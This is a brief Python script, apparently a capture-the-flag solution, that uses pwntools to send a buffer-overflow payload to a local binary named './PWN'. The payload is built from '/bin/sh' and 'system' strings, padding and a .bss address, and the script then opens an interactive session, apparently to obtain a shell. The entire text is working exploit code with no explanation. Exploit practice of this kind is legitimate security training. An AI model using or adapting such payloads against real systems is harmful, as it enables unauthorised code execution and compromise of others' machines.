#coding=utf8
from pwn import *

sh = process("./PWN")
bss = 0x804A0A0
payload = flat(['/bin/sh\x00','a'*(0x3a-0x1c-8),'system\x00','a'*(0x1c-0xc-7),bss,'a'*(0xc+4), 0xDEADBEEF])
sh.sendline(payload)
sh.interactive()
